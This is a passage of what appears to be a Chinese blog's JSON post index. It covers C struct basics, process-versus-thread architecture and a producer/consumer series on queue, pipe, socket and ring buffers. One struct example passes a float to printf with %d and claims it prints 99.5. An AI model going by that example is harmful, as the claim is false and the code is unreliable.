,double…诸如此类）。姑且把结构体所容纳的变量叫做成员变量。 1234567struct stu&#123; char *name; //姓名 int num; //学号 int age; //年龄 char group; //所在学习小组 float score; //成绩&#125;; 注意：结构体大括号后面的；不能丢，否则不是完整的语句。 既然结构体是一种数据类型，那么就可以用它来定义变量。 12345678910struct stu&#123; char *name; //姓名 int num; //学号 int age; //年龄 char group; //所在学习小组 float score; //成绩&#125; stu1, stu2;//这是一种定义变量的方法，直接在大括号尾部定义//还可以如下定义struct stu stu3,stu4;//定义的时候，struct stu作为整体出现 上述代码中，stu1与stu2便是由stu数据类型定义的变量（类比于int类型定义stu1与stu2）。 需要注意的是:结构体是创建变量的模板（没东西的容器），不占用内存；结构体变量才包含了真实的数据，需要内存来存储。 二、结构体数组与结构体指针 类比着讲更容易理解。拿int类型举例，int可以定义整型数组，类比来看，结构体数据类型，同样可以定义数组。 1234567891011121314struct stu&#123; char *name; //姓名 int num; //学号 int age; //年龄 char group; //所在小组 float score; //成绩&#125;;//先定义一个结构体数据类型int main()&#123; int i[5];//定义整型数组 struct stu j[5];//定义stu类型数组 return 0;&#125; 从代码中可以发现，stu类型数组j包含了五组stu内部的成员变量（name，num，age，group，score）。 结构体数组的使用很简单j[0].score;表示的意思就是stu类型的j数组中第一组score。 当一个指针变量指向结构体时，我们就称它为结构体指针。 注意:结构体变量名和数组名不同，数组名在表达式中会被转换为数组指针，而结构体变量名不会，无论在任何表达式中它表示的都是整个集合本身，要想取得结构体变量的地址，必须在前面加&amp; 1234567891011121314struct stu&#123; char *name; //姓名 int num; //学号 int age; //年龄 char group; //所在学习小组 float score; //成绩&#125; stu1, stu2;int main()&#123; struct stu *pstu=&amp;stu1;//只能这样赋值 struct stu *pstu=stu1;//这样赋值是错的 return 0;&#125; 通过结构体指针可获得结构体中的成员，(*pstu).score或者pstu-&gt;score。 三、结构体变量作为函数参数 结构体变量名代表的是整个容器，里面所有成员作为一个集合在一起。而不是同数组一样被编译器转换成指针，用结构体变量传参会极大影响程序的效率。最好的方法就是使用指针，这时由实参传向形参的只是一个地址。 123456789101112131415161718struct stu&#123; char *name; //姓名 int num; //学号 int age; //年龄 char group; //所在学习小组 float score; //成绩&#125; stu1, stu2;void test(struct stu *pstu);int main()&#123; stu1.score=99.5; test(&amp;stu1); return 0;&#125;void test(struct stu *pstu1)&#123; printf(&quot;%d&quot;,pstu1-&gt;score);&#125; 输出结果99.5。 四、typedef的用法 typedef相当于起外号的工具，在定义结构体变量时非常方便！ 1234typedef struct stu&#123; char name[20]; int age;&#125; Stu; 如果没有typedef，我们定义结构体变量时，struct stu student1；还要如上操作。但有了typedef，我们给struct stu起了一个外号Stu。如此一来，在定义结构体类型变量时，只需Stu student1；即可。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"}]},{"title":"粒计算综述","date":"2021-07-16T16:49:45.000Z","path":"2021/07/17/粒计算综述/","text":"","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"粒计算","slug":"粒计算","permalink":"http://1905060202.github.io/tags/%E7%B2%92%E8%AE%A1%E7%AE%97/"}]},{"title":"架构设计：进程还是线程？","date":"2021-07-16T16:47:27.000Z","path":"2021/07/17/架构设计：进程还是线程？/","text":"架构设计：进程还是线程？是一个问题！文章目录 ★进程【颗粒度】问题★“以业务逻辑为单元”划分进程的好处★进程间通讯（以下简称 IPC）问题★为啥还要线程？ 就像莎士比亚的“To be, or not to be, that is the question”始终困扰着哈姆雷特，对于“进程还是线程？”这个问题，也经常困扰着那些进行软件架构设计的家伙。所以今天打算聊一下我对这个问题的体会。假如你还搞不清楚线程和进程的区别，请先找本操作系统原理的书好好拜读一下，再回来看帖。由于这个问题很容易引发口水战，事先声明如下：多进程和多线程，无法一概而论地说谁比谁好。因此本帖主要描述特定场景（与我所负责的产品相关）下，进程和线程的权衡经验，仅供大伙儿参考。 由于特定场景是本帖讨论的前提，先说说我目前负责的产品的特点：业务逻辑比较复杂、业务数据量比较大、对数据实时处理的性能要求比较高、对健壮性和安全性要求比较高、要求跨平台（包括操作系统、数据库）、某些情况下需要分布部署。 上面说了一大堆，其实有不少的应用系统符合上述特点，比如：某些网络游戏服务器、某些金融行业的业务系统、某些电子商务的交易系统等等。如果你正在从事的是类似的应用系统的设计，希望我下面介绍的经验对你有帮助。 ★进程【颗粒度】问题 大伙儿应该明白，进程和线程都是处理并发（concurrency）的手段。对于上述这种比较复杂的系统，如果你企图全部用进程（见“注1”）或者全部用线程（见“注2”）来处理并发，估计会死得很难看。所以，关键问题就是如何在进程和线程之间进行平衡（也就是确定进程颗粒度的问题）。 注1 所谓“全部用进程”，就是所有的并发都使用进程实现（因此每个进程只有一个线程）。这种设计在某些平台上（比如 Windows）会导致严重的性能问题。 注2 所谓“全部用线程”，就是所有的并发都使用线程实现（因此整个系统只有一个进程）。这种设计的健壮性极差（一个致命错会导致整个系统崩溃），而且更别提分布部署了。 我个人建议，尽量以业务逻辑的单元来划分进程。这样做的好处有如下几点： ★“以业务逻辑为单元”划分进程的好处◇避免扯皮 一般来说，某个固定业务逻辑的开发人员也是相对固定的。如果业务逻辑对应的某个进程崩溃了，测试人员容易快速定位肇事者，然后直接提交Bug给他/她。 反之，一个进程搞得太庞大，N 多人掺和在里面，一旦进程崩溃了，相关编程人员之间很容易互相扯皮，不利于维护安定团结的局面；另外，由于测试人员经常搞不清楚 Bug 属于谁，经常给错 Bug，也容易制造人民内部矛盾。 由此可以看出，【相对细】的进程颗粒度能够避免一些管理上的麻烦。由于 XXX 经常教导我们：“稳定压倒一切”，所以该优点列第一条。 ◇健壮性、容错性 一般来说，开发人员的水平参差不齐，优秀的毕竟是少数。所以难免会有菜鸟程序员搞出低级错误，而有些低级错误是致命的，会导致进程的崩溃。 如果你是以业务逻辑划分进程，一个业务逻辑的进程崩溃，对其它业务逻辑的影响不大（除非是该业务逻辑的依赖方）；因此就不会出现“全部用线程”导致的弊端。 ◇分布式 我常碰见的分布式部署需求，一般都是按照业务逻辑的维度来划分。比如系统中有一个认证模块，里面包含有敏感的用户认证信息。这时候客户就会要求把该模块单独部署在一台经过安全加固的主机中（以防阶级敌人搞破坏）。 如果是以业务逻辑为单位划分进程，要满足上述的部署需求就相对容易了（只要再配合恰当的进程间通讯机制，下面会提到）。 另外，支持分布式部署还可以顺带解决性能问题。比如某个业务逻辑模块特别消耗硬件资源（比如：内存、CPU、硬盘、带宽），就可以把它拿出去单独放一台机器上跑。 ◇跨编程语言 这个好处可能很多人容易忽略。一般来说，每个编程语言都有各自的优缺点。如果你通过业务逻辑划分进程，就可以根据不同的业务逻辑的特点来选择合适的编程语言。 比如：对于性能敏感的模块，我就使用 C++ 搞定；而对于一些业务逻辑密集型的模块，则使用 Java 或 Python 开发。 ★进程间通讯（以下简称 IPC）问题 既然不可能把整个系统放入一个进程，那就必然会碰到 IPC 的问题。下面就来说一下该如何选择 IPC。 各种操作系统里面，有很多稀奇古怪的 IPC 类型。由于要考虑跨平台，首先砍掉一批（关于 IPC 的跨平台问题，我在“跨平台开发”系列中会提到）。剩下的 IPC 类型中，能够进行数据传输的 IPC 就不多了，主要有如下几种：套接字（以下简称 Socket）、共享内存、管道、文件。其中 Socket 是俺强烈推荐的 IPC 方式，理由如下：使用 Socket 可以天然地支持分布式部署；使用 Socket 可以比较容易地实现多种编程语言的混合（比如：C++、Java、Python、Flex 都支持 Socket）；使用 Socket 还可以省掉了一大坨“锁操作”的代码。 列位看官中，或许有人在担心 Socket 的性能问题，其实大可不必多虑。当两个进程在【本机】上进行 Socket 通讯时，由于可以使用 localhost 环回地址，数据不用经过物理网卡，操作系统内核还可以进行某些优化。这种情况下，Socket 相对其它几种IPC机制，不会有太大的性能偏差。 最后再补充一下，Socket 方式也可以有效防止扯皮问题。举个例子：张三写了一个进程 A，李四写了一个进程 B，进程 A 通过 Socket 方式发数据给进程B。突然有一天，两个进程的通讯出故障了。然后张三就说是李四接收数据出错；李四就说张三发送数据出错。这时候怎么办捏？很简单，随便找个 Sniffer 软件当场抓一下数据包并 Dump 出来看，问题就水落石出了。 ★为啥还要线程？ 上面说了这么多进程的好处，有同学要问了：“那线程有什么用捏？”总的来说，使用线程出于两方面的考虑：性能因素和编码方便。 ◇性能因素 由于某些操作系统（比如 Windows）中的进程比较重型，如果【频繁】创建进程或者创建大量进程，会导致操作系统的负载过高。举例如下： 假设你要开发一个类似 Web Server 的应用。你针对每一个客户端请求创建一个对应的进程用于进行数据交互（是不是想起了古老的 CGI）。一旦这个系统扩容，用户的并发连接数一增加，你的应用立马死翘翘。 上面的例子表明，跨平台软件系统的进程数要保持相对稳定。如果你的进程数会随着某些环境因素呈线性增长，那就相当不妙了（顺带说一下，如果线程数会随着环境因素呈线性增长，也相当不妙）。而根据业务逻辑的单元划分进程，顺便能达到“进程数的相对稳定”的效果。 ◇编码方面 由于业务逻辑内部的数据耦合比较紧密。如果业务逻辑内部的并发也用进程来实现，可能会导致大量的 IPC 编码（任意两个进程之间只要有数据交互，就得写一坨 IPC 代码）。这或许会让相关的编程人员怨声载道。 当然，编码方面的问题也不是绝对的。假如你的系统有很成熟且方便易用的IPC库，可以比较透明地封装IPC相关操作，那这方面的问题也就不存在了。 写到这里，看看篇幅有点超，就此打住。大伙儿如有不同看法，请到评论中拍砖。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"架构设计：生产者/消费者模式","date":"2021-07-16T16:37:29.000Z","path":"2021/07/17/架构设计：生产者-消费者模式/","text":"架构设计：生产者/消费者模式[0]：概述文章目录 ★简介★优点★本系列的目录 今天打算来介绍一下“生产者／消费者模式”，这玩意儿在很多开发领域都能派上用场。鉴于该模式很重要且相关内容比较丰富，俺打算分几个帖子逐一介绍。今天先来扫盲一把。如果你对这个模式已经比较了解，请跳过本帖子，直接看下一个帖子（关于如何确定数据单元）。 看到这里，可能有同学心中犯嘀咕了：在四人帮（Gang Of Four）的23种模式里面似乎没听说过这种嘛！其实 GOF 那经典的23种模式主要是基于 OO 的（从书名《Design Patterns: Elements of Reusable Object-Oriented Software》就可以看出来）。而 Pattern 实际上即可以是 OO 的 Pattern，也可以是非 OO 的 Pattern 的。 ★简介 言归正传！在实际的软件开发过程中，经常会碰到如下场景：某个模块负责产生数据，这些数据由另一个模块来负责处理（此处的模块是广义的，可以是类、函数、线程、进程等）。产生数据的模块，就形象地称为【生产者】；而处理数据的模块，就称为【消费者】。 单单抽象出生产者和消费者，还够不上是生产者／消费者模式。该模式还需要有一个缓冲区处于生产者和消费者之间，作为一个中介。生产者把数据放入缓冲区，而消费者从缓冲区取出数据。大概的结构如下图。 为了不至于太抽象，咱们举一个寄信的例子（虽说这年头寄信已经不时兴，但这个例子还是比较贴切的）。假设你要寄一封平信，大致过程如下：1、你把信写好——相当于生产者制造数据2、你把信放入邮筒——相当于生产者把数据放入缓冲区3、邮递员把信从邮筒取出——相当于消费者把数据取出缓冲区4、邮递员把信拿去邮局做相应的处理——相当于消费者处理数据 ★优点 可能有同学会问了：这个缓冲区有什么用捏？为什么不让生产者直接调用消费者的某个函数，直接把数据传递过去捏？搞出这么个缓冲区作甚？ 其实这里面是大有讲究的，大概有如下一些好处。 ◇解耦 假设生产者和消费者分别是两个类。如果让生产者直接调用消费者的某个方法，那么生产者对于消费者就会产生依赖（也就是耦合）。将来如果消费者的代码发生变化，可能会影响到生产者。而如果两者都依赖于某个缓冲区，两者之间不直接依赖，耦合也就相应降低了。 接着上述的例子，如果不使用邮筒（也就是缓冲区），你必须得把信直接交给邮递员。有同学会说，直接给邮递员不是挺简单的嘛？其实不简单，你必须得认识谁是邮递员，才能把信给他（光凭身上穿的制服，万一有人假冒，就惨了）。这就产生和你和邮递员之间的依赖（相当于生产者和消费者的【强】耦合）。万一哪天邮递员换人了，你还要重新认识一下（相当于消费者变化导致修改生产者代码）。而邮筒相对邮递员来说比较固定，你依赖它的成本也就比较低（相当于和缓冲区之间的【弱】耦合）。 ◇支持并发（concurrency） 生产者直接调用消费者的某个方法，还有另一个弊端。由于函数调用是同步的（或者叫阻塞的），在消费者的方法没有返回之前，生产者只好一直等在那边。万一消费者处理数据很慢，生产者就会白白糟蹋大好时光。 使用了生产者／消费者模式之后，生产者和消费者可以是两个独立的并发主体（常见的并发类型有进程和线程两种，后面的帖子会讲两种并发类型下的应用）。生产者把制造出来的数据往缓冲区一丢，就可以再去生产下一个数据。基本上不用依赖消费者的处理速度。 其实当初这个模式，主要就是用来处理并发问题的。 从寄信的例子来看。如果没有邮筒，你得拿着信傻站在路口等邮递员过来收（相当于生产者阻塞）；又或者邮递员得挨家挨户问，谁要寄信（相当于消费者轮询）。不管是哪种方法，都挺土的。 ◇支持忙闲不均 缓冲区还有另一个好处。如果制造数据的速度时快时慢，缓冲区的好处就体现出来了。当数据制造快的时候，消费者来不及处理，未处理的数据可以暂时存在缓冲区中。等生产者的制造速度慢下来，消费者再慢慢处理掉。 为了充分复用、节省打字，俺再拿寄信的例子来说事儿。假设邮递员一次只能带走1000封信。万一某次碰上情人节（也可能是圣诞节）送贺卡，需要寄出去的信超过1000封，这时候邮筒这个缓冲区就派上用场了。邮递员把来不及带走的信暂存在邮筒中，等下次过来时再拿走。 费了这么多口水，希望原先不太了解生产者／消费者模式的同学能够明白它是怎么一回事。下一个帖子，首先聊一下“如何确定数据单元”。 ★本系列的目录 为了方便阅读，把本系列帖子的目录整理如下（需翻墙）： 如何确定数据单元 队列缓冲区 环形缓冲区 双缓冲区 架构设计：生产者/消费者模式[1]：如何确定数据单元？文章目录 ★啥是数据单元？★数据单元的特性 既然前文已经搞过扫盲了，那接下来应该开始聊一些具体的编程技术问题了。不过在进入具体的技术细节之前，咱们先要搞明白一个问题：如何确定数据单元？只有把数据单元分析清楚，后面的技术设计才好搞。 ★啥是数据单元？ 何谓数据单元捏？简单地说，每次生产者放到缓冲区的，就是一个数据单元；每次消费者从缓冲区取出的，也是一个数据单元。对于前文中寄信的例子，我们可以把每一封单独的信件看成是一个数据单元。 不过光这么介绍，太过于简单，无助于大伙儿分析出这玩意儿。所以，后面咱们来看一下数据单元需要具备哪些特性。搞明白这些特性之后，就容易从复杂的业务逻辑中分析出适合做数据单元的东西了。 ★数据单元的特性 分析数据单元，需要考虑如下几个方面的特性： ◇关联到业务对象 首先，数据单元必须关联到某种业务对象。在考虑该问题的时候，你必须深刻理解当前这个生产者／消费者模式所对应的【业务逻辑】，才能够作出合适的判断。 由于“寄信”这个业务逻辑比较简单，所以大伙儿很容易就可以判断出数据单元是啥。但现实生活中，往往没这么乐观。大多数业务逻辑都比较复杂，当中包含的业务对象是层次繁多、类型各异。在这种情况下，就不易作出决策了。 虽说这一步有难度，但是很重要！如果选错了业务对象，会导致后续程序设计和编码实现的复杂度大为上升，增加了开发和维护成本。 ◇完整性 所谓完整性，就是在传输过程中，要保证该数据单元的完整。要么【整个】数据单元被传递到消费者，要么完全没有传递到消费者。不允许出现【部分】传递的情形。 对于寄信来说，你【不能】把半封信放入邮筒；同样的，邮递员从邮筒中拿信，也【不能】只拿出信的一部分。 ◇独立性 所谓独立性，就是各个数据单元之间没有互相依赖，某个数据单元传输失败【不应该】影响已经完成传输的单元；也【不能】影响尚未传输的单元。 为啥会出现传输失败捏？假如生产者的生产速度在一段时间内一直超过消费者的处理速度，那就会导致缓冲区不断增长并达到上限，之后就很不妙了（有些数据单元会被无情地抛弃）。如果数据单元相互独立，等到生产者的速度降下来之后，后续的数据单元继续处理，不会受到牵连；反之，如果数据单元之间有某种耦合，导致被丢弃的数据单元会影响到后续其它单元的处理，那就会使程序逻辑变得非常复杂。 对于寄信来说，某封信弄丢了，不会影响后续信件的送达；当然更不会影响已经送达的信件。 ◇颗粒度 前面提到，数据单元需要关联到某种业务对象。那么数据单元和业务对象是否要一一对应捏？很多场合确实是一一对应的。 不过，有时出于性能等因素的考虑，也可能会把N个业务对象打包成一个数据单元。那么，这个N该如何取值就是颗粒度的考虑了。颗粒度的大小是有讲究的。太大的颗粒度可能会浪费空间；太小的颗粒度可能会影响时间性能。颗粒度的权衡要基于多方面的因素，以及一些经验值的考量。 还是拿寄信的例子。如果颗粒度过小（比如设定为1），那邮递员每次只取出1封信。如果信件多了，那就得来回跑好多趟，浪费了时间。 如果颗粒度太大（比如设定为100），那寄信的人得等到凑满100封信才拿去放入邮筒。假如平时很少写信，就得等上很久，也不太爽。 可能有同学会问：生产者和消费者的颗粒度能否设置成不同大小（比如对于寄信人设置成1，对于邮递员设置成100）。当然，理论上可以这么干，但是在某些情况下会增加程序逻辑和代码实现的复杂度。后面讨论具体技术时，大伙儿应该能体会到数据单元的重要性。 好，数据单元的话题就说到这。希望通过本帖子，大伙儿能够搞明白数据单元到底是怎么一回事。下一个帖子，咱们来聊一下“基于队列的缓冲区”，技术上如何实现。 架构设计：生产者/消费者模式[2]：队列缓冲区文章目录 ★线程方式★进程方式 经过前面两个帖子的铺垫，今天终于开始聊一些具体的编程技术了。由于不同的缓冲区类型、不同的并发场景对于具体的技术实现有较大的影响。为了深入浅出、便于大伙儿理解，咱们先来介绍最传统、最常见的方式。也就是单个生产者对应单个消费者，当中用【队列】（FIFO）作缓冲。 ★线程方式 先来说一下并发线程中使用队列的例子，以及相关的优缺点。 ◇内存分配的性能 在线程方式下，生产者和消费者各自是一个线程。生产者把数据写入队列头（以下简称 push），消费者从队列尾部读出数据（以下简称 pop）。当队列为空，消费者就稍息（稍事休息）；当队列满（达到最大长度），生产者就稍息。整个流程并不复杂。 那么，上述过程会有什么问题捏？一个主要的问题是关于内存分配的性能开销。对于常见的队列实现：在每次 push 时，可能涉及到【堆内存】的分配；在每次 pop 时，可能涉及【堆内存】的释放。假如生产者和消费者都很勤快，频繁地 push、pop，那内存分配的开销就很可观啦！对于内存分配的开销，用 Java 的同学可以参见前几天的帖子“[Java 性能优化1]”；对于用 C/C++ 的同学，想必对 OS 底层机制会更清楚，应该知道分配【堆内存】（new 或 malloc）会有加锁的开销和用户态/核心态切换的开销。 那该怎么办捏？请听下文分解，关于“生产者/消费者模式[3]：环形缓冲区”。 ◇同步和互斥的性能 另外，由于两个线程共用一个队列，自然就会涉及到线程间诸如同步啊、互斥啊、死锁啊等等劳心费神的事情。好在”操作系统”这门课程对此有详细介绍，学过的同学应该还有点印象吧？对于没学过这门课的同学，也不必难过，网上相关的介绍挺多的（比如“这里”），大伙自己去瞅一瞅。关于这方面的细节，咱今天就不多啰嗦了。 这会儿要细谈的是，同步和互斥的性能开销。在很多场合中，诸如信号量、互斥量等玩意儿的使用也是有不小的开销的（某些情况下，也可能导致用户态/核心态切换）。如果像刚才所说，生产者和消费者都很勤快，那这些开销也不容小觑啊。 这又该咋办捏？请听下文的下文分解，关于“生产者/消费者模式[4]：双缓冲区”。 ◇适用于队列的场合 刚才尽批判了队列的缺点，难道队列方式就一无是处？非也。由于队列是很常见的数据结构，大部分编程语言都内置了队列的支持（具体介绍见“这里”），有些语言甚至提供了线程安全的队列（比如JDK 1.5引入的 ArrayBlockingQueue）。因此，开发人员可以捡现成，避免了重新发明轮子。 所以，假如你的数据流量不是很大，采用队列缓冲区的好处还是很明显的：逻辑清晰、代码简单、维护方便。比较符合 KISS 原则。 ★进程方式 说完了线程的方式，再来介绍基于进程的并发。 跨进程的生产者／消费者模式，非常依赖于具体的进程间通讯（IPC）方式。而IPC的种类名目繁多，不便于挨个列举（毕竟口水有限）。因此咱们挑选几种跨平台、且编程语言支持较多的IPC方式来说事儿。 ◇匿名管道 感觉管道是最像队列的IPC类型。生产者进程在管道的写端放入数据；消费者进程在管道的读端取出数据。整个的效果和线程中使用队列非常类似，区别在于使用管道就无需操心线程安全、内存分配等琐事（操作系统暗中都帮你搞定了）。 管道又分“命名管道”和“匿名管道”两种，今天主要聊匿名管道。因为命名管道在不同的操作系统下差异较大（比如 Win32 和 POSIX，在命名管道的 API 接口和功能实现上都有较大差异；有些平台不支持命名管道，比如 Windows CE）。除了操作系统的问题，对于有些编程语言（比如 Java）来说，命名管道是无法使用的。所以俺一般不推荐使用这玩意儿。 其实匿名管道在不同平台上的 API 接口，也是有差异的（比如 Win32 的 CreatePipe 和 POSIX 的 pipe，用法就很不一样）。但是我们可以仅使用标准输入和标准输出（以下简称 stdio）来进行数据的流入流出。然后利用 shell 的管道符把生产者进程和消费者进程关联起来（没听说过这种手法的同学，可以看“这里”）。实际上，很多操作系统（尤其是 POSIX 风格的）自带的命令都充分利用了这个特性来实现数据的传输（比如 more、grep 等）。 这么干有如下几个好处：\\1. 基本上所有操作系统都支持在 shell 方式下使用管道符。因此很容易实现跨平台。\\2. 大部分编程语言都能够操作 stdio，因此跨编程语言也就容易实现。\\3. 刚才已经提到，管道方式省却了线程安全方面的琐事。有利于降低开发、调试成本。 当然，这种方式也有自身的缺点：\\1. 生产者进程和消费者进程必须得在同一台主机上，无法跨机器通讯。这个缺点比较明显。\\2. 在一对一的情况下，这种方式挺合用。但如果要扩展到一对多或者多对一，那就有点棘手了。所以这种方式的扩展性要打个折扣。假如今后要考虑类似的扩展，这个缺点就比较明显。\\3. 由于管道是 shell 创建的，对于两边的进程不可见（程序看到的只是 stdio）。在某些情况下，导致程序不便于对管道进行操纵（比如调整管道缓冲区尺寸）。这个缺点不太明显。\\4. 最后，这种方式只能单向传数据。好在大多数情况下，消费者进程不需要传数据给生产者进程。万一你确实需要信息反馈（从消费者到生产者），那就费劲了。可能得考虑换种 IPC 方式。 顺便补充几个注意事项，大伙儿留意一下：\\1. 对 stdio 进行读写操作是以阻塞方式进行。比如管道中没有数据，消费者进程的读操作就会一直停在哪儿，直到管道中重新有数据。\\2. 由于 stdio 内部带有自己的缓冲区（这缓冲区和管道缓冲区是两码事），有时会导致一些不太爽的现象（比如生产者进程输出了数据，但消费者进程没有立即读到）。具体的细节，大伙儿可以看”这篇文章“。 ◇SOCKET（TCP 方式） 基于 TCP 方式的 SOCKET 通讯是又一个类似于队列的 IPC 方式。它同样保证了数据的顺序到达；同样有缓冲的机制。而且这玩意儿也是跨平台和跨语言的，和刚才介绍的 shell 管道符方式类似。 SOCKET 相比 shell 管道符的方式，有啥优点捏？请看：\\1. SOCKET 方式可以跨机器（便于实现分布式）。这是主要优点。\\2. SOCKET 方式便于将来扩展成为多对一或者一对多。这也是主要优点。\\3. SOCKET 可以设置阻塞和非阻塞方法，用起来比较灵活。这是次要优点。\\4. SOCKET 支持双向通讯，有利于消费者反馈信息。 当然有利就有弊。相对于上述 shell 管道的方式，使用 SOCKET 在编程上会更复杂一些。好在前人已经做了大量的工作，搞出很多 SOCKET 通讯库和框架给大伙儿用（比如 C++ 的 ACE 库、Python 的 Twisted）。借助于这些第三方的库和框架，SOCKET 方式用起来还是比较爽的。由于具体的网络通讯库该怎么用不是本系列的重点，此处就不细说了。 虽然 TCP 在很多方面比 UDP 可靠，但鉴于跨机器通讯先天的不可预料性（比如网线可能被某个傻X给拔错了，网络的忙闲波动可能很大），在程序设计上我们还是要多留一手。具体该如何做捏？可以在生产者进程和消费者进程内部各自再引入基于线程的“生产者／消费者模式”。这话听着像绕口令，为了便于理解，画张图给大伙儿瞅一瞅。 这么做的关键点在于把代码分为两部分：生产线程和消费线程属于和业务逻辑相关的代码（但和通讯逻辑无关）；发送线程和接收线程属于通讯相关的代码（但和业务逻辑无关）。 这样的好处是很明显的，具体如下：\\1. 能够应对暂时性的网络故障。并且在网络故障解除后，能够继续工作。\\2. 网络故障的应对处理方式（比如断开后的尝试重连），只影响发送和接收线程，不会影响生产线程和消费线程（业务逻辑部分）。\\3. 具体的 SOCKET 方式（阻塞和非阻塞）只影响发送和接收线程，不影响生产线程和消费线程（业务逻辑部分）。\\4. 不依赖 TCP 自身的发送缓冲区和接收缓冲区。（默认的 TCP 缓冲区的大小可能无法满足实际要求）\\5. 业务逻辑的变化（比如业务需求变更）不影响发送线程和接收线程。 针对上述的最后一条，再多啰嗦几句。如果整个业务系统中有多个进程是采用上述的模式，那或许可以重构一把：在业务逻辑代码和通讯逻辑代码之间切一刀，把业务逻辑无关的部分封装成一个通讯中间件（说“中间件”显得比较牛逼 :-）。如果大伙儿对这玩意儿有兴趣，以后专门开个帖子聊。下一个帖子，咱们来介绍一下环形缓冲区的话题。 架构设计：生产者/消费者模式[3]：环形缓冲区文章目录 ★环形缓冲区 vs 队列缓冲区★环形缓冲区的实现★应用场合 前文提及了队列缓冲区可能存在的性能问题及解决方法：环形缓冲区。今天就专门来描述一下这个话题。 为了防止有人给咱扣上“过度设计”的大帽子，事先声明一下：只有当存储空间的分配／释放非常【频繁】并且确实产生了【明显】的影响，你才应该考虑环形缓冲区的使用。否则的话，还是老老实实用最基本、最简单的队列缓冲区吧。还有一点需要说明一下：本文所提及的“存储空间”，不仅包括内存，还可能包括诸如硬盘之类的存储介质。 ★环形缓冲区 vs 队列缓冲区◇外部接口相似 在介绍环形缓冲区之前，咱们先来回顾一下普通的队列。普通的队列有一个写入端和一个读出端。队列为空的时候，读出端无法读取数据；当队列满（达到最大尺寸）时，写入端无法写入数据。 对于使用者来讲，环形缓冲区和队列缓冲区是一样的。它也有一个写入端（用于 push）和一个读出端（用于 pop），也有缓冲区“满”和“空”的状态。所以，从队列缓冲区切换到环形缓冲区，对于使用者来说能比较平滑地过渡。 ◇内部结构迥异 虽然两者的对外接口差不多，但是内部结构和运作机制有很大差别。队列的内部结构此处就不多啰嗦了。重点介绍一下环形缓冲区的内部结构。 大伙儿可以把环形缓冲区的读出端（以下简称 R）和写入端（以下简称 W）想象成是两个人在体育场跑道上追逐。当 R 追上 W 的时候，就是缓冲区为空；当 W 追上 R 的时候（W 比 R 多跑一圈），就是缓冲区满。 为了形象起见，去找来一张图并略作修改，如下： 从上图可以看出，环形缓冲区所有的 push/pop 操作都是在一个【固定】的存储空间内进行。而队列缓冲区在 push 的时候，可能会分配存储空间用于存储新元素；在 pop 时，可能会释放废弃元素的存储空间。所以环形方式相比队列方式，少掉了对于缓冲区元素所用存储空间的分配、释放。这是环形缓冲区的一个主要优势。 ★环形缓冲区的实现 如果你手头已经有现成的环形缓冲区可供使用，并且你对环形缓冲区的内部实现不感兴趣，可以跳过这段。 ◇数组方式 vs 链表方式 环形缓冲区的内部实现，即可基于数组（此处的数组，泛指连续存储空间）实现，也可基于链表实现。 数组在物理存储上是一维的连续线性结构，可以在初始化时，把存储空间【一次性】分配好，这是数组方式的优点。但是要使用数组来模拟环，你必须在逻辑上把数组的头和尾相连。在顺序遍历数组时，对尾部元素（最后一个元素）要作一下特殊处理。访问尾部元素的下一个元素时，要重新回到头部元素（第0个元素）。如下图所示： 使用链表的方式，正好和数组相反：链表省去了头尾相连的特殊处理。但是链表在初始化的时候比较繁琐，而且在有些场合（比如后面提到的跨进程的 IPC）不太方便使用。 ◇读写操作 环形缓冲区要维护两个索引，分别对应写入端（W）和读取端（R）。写入（push）的时候，先确保环没满，然后把数据复制到 W 所对应的元素，最后 W 指向下一个元素；读取（pop）的时候，先确保环没空，然后返回 R 对应的元素，最后 R 指向下一个元素。 ◇判断“空”和“满” 上述的操作并不复杂，不过有一个小小的麻烦：空环和满环的时候，R 和 W 都指向同一个位置！这样就无法判断到底是“空”还是“满”。大体上有两种方法可以解决该问题。办法1：始终保持一个元素不用 当空环的时候，R 和 W 重叠。当 W 比 R 跑得快，追到距离 R 还有一个元素间隔的时候，就认为环已经满。当环内元素占用的存储空间较大的时候，这种办法显得很土（浪费空间）。办法2：维护额外变量 如果不喜欢上述办法，还可以采用额外的变量来解决。比如可以用一个整数记录当前环中已经保存的元素个数（该整数&gt;=0）。当 R 和 W 重叠的时候，通过该变量就可以知道是“空”还是“满”。 ◇元素的存储 由于环形缓冲区本身就是要降低存储空间分配的开销，因此缓冲区中元素的类型要选好。尽量存储【值类型】的数据，而不要存储【指针（引用）类型】的数据。因为指针类型的数据又会引起存储空间（比如堆内存）的分配和释放，使得环形缓冲区的效果大打折扣。 ★应用场合 刚才介绍了环形缓冲区内部的实现机制。按照前文的惯例，我们来介绍一下在线程和进程方式下的使用。 如果你所使用的编程语言和开发库中带有现成的、成熟的环形缓冲区，强烈建议使用现成的库，不要重新制造轮子；确实找不到现成的，才考虑自己实现。（如果你纯粹是业余时间练练手，那另当别论） ◇用于并发线程 和线程中的队列缓冲区类似，线程中的环形缓冲区也要考虑线程安全的问题。除非你使用的环形缓冲区的库已经帮你实现了线程安全，否则你还是得自己动手搞定。线程方式下的环形缓冲区用得比较多，相关的网上资料也多，下面就大致介绍几个。 对于 C++ 的程序员，强烈推荐使用 boost 提供的 circular_buffer 模板，该模板最开始是在 boost 1.35版本中引入的。鉴于 boost 在 C++ 